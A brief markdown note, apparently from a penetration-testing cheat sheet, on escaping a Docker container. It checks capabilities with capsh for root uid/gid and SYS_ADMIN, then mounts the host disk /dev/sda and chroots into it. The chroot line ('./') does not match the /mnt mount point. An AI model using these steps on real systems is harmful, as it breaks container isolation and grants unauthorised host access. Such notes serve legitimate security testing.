* Run within docker container inside:<br>
```
capsh --print 
```
  * Check if root in uid = 0
  * Check if root in gid = 0
  * Check if sys_admin 
    *  If yes to above all, host easialy exploitable:
    ```
    mount /dev/sda /mnt/
    chroot ./ bash
    ```
